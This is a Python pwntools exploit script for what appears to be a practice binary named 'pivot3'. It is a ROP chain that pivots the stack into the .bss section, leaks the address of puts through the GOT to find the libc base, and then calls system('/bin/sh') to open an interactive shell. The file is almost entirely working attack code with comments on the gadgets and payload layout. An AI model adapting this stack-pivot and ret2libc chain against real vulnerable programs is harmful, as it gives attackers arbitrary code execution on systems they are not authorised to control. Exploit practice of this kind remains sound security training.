from pwn import *

p = process("./pivot3")
e = ELF("./pivot3")
libc = e.libc

bss1 = 0x601020 +0x800
bss2 = 0x601020 + 0x900
read_plt = e.plt['read']
puts_got = e.got['puts']
puts_plt = e.plt['puts']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']

pop_rdi = 0x00400783
pop_rsi_r15 = 0x00400781
leave_ret = 0x0040071e
ret = 0x0040053e

#read(0, bss, rdx=0x70) -> rbp to bss
payload = b'A'*0x30         #buf
payload += p64(bss1)   #sfp
payload += p64(pop_rdi)
payload += p64(0)           #rdi = 0
payload += p64(pop_rsi_r15)
payload += p64(bss1)   #rsi = bss
payload += p64(0)           #(r15=0)
                            #rdx = 0x70
payload += p64(read_plt)    #func
payload += p64(leave_ret)   #ret

pause()
p.send(payload)

#puts_plt(puts_got) -> read(0, bss, rdx=0x70) -> rbp to bss
payload = p64(bss2)    #sfp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(0)           #rdi = 0
payload += p64(pop_rsi_r15)
payload += p64(bss2)   #rsi = bss
payload += p64(0)           #(r15=0)
                            #rdx = 0x70
payload += p64(read_plt)    #func
payload += p64(leave_ret)   #ret

p.send(payload)

puts_addr = u64(p.recv(6).strip().ljust(8, b"\x00"))
log.info("puts_addr: " + hex(puts_addr))
libc_base = puts_addr - puts_offset
log.info("libc_base: " + hex(libc_base))
system_addr = libc_base + system_offset
binsh = libc_base + list(libc.search(b"/bin/sh"))[0]

payload = b'B'*8          #dummy
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)         #stack align
payload += p64(system_addr)


pause()
p.send(payload)


p.interactive()